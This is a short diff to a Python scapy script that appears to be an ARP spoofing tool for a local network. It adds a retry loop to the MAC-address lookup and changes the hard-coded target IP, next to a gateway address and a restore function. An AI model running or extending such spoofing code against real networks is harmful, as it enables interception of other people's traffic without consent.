@@ -11,11 +11,13 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
 # this line will return 2 lists, answered and unanswered.Timeout will specify time to request
-#     while True:
-    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]#verbose=False for no output on console
-    return answered_list[0][1].hwsrc
+    while True:
+        answered_list = scapy.srp(arp_request_broadcast,timeout=2,verbose=False)[0]#verbose=False for no output on console
+        mac = answered_list[0][1].hwsrc
 
-    #sender Ip address and Mac address which broadcast the broadcast
+        if mac:
+            return mac
+        #sender Ip address and Mac address which broadcast the broadcast
     # print(answered_list[0][0].pdst)
     # print(answered_list[0][0].hwdst)
 # IP & MAC who replied for the packet
@@ -41,7 +43,7 @@ def restore(destination_ip, source_ip):
 
 
 # get_mac("192.168.0.1/24")
-target_ip = "192.168.0.117"
+target_ip = "192.168.0.105"
 gateway_ip = "192.168.0.1"
 send_packets_count = 0
 try:
